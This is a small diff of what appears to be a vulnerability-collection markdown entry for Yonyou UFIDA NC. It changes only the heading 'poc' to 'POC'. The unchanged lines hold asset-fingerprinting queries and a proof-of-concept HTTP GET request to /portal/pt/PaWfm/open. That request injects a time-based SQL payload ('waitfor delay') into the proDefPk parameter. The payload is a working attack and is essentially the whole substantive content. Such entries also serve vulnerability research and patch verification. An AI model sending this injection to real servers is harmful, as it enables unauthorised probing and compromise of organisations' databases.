@@ -6,7 +6,7 @@ icon_hash="1085941792"
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 ```
 GET /portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:6'-- HTTP/1.1
 Host: 192.168.63.129:8088
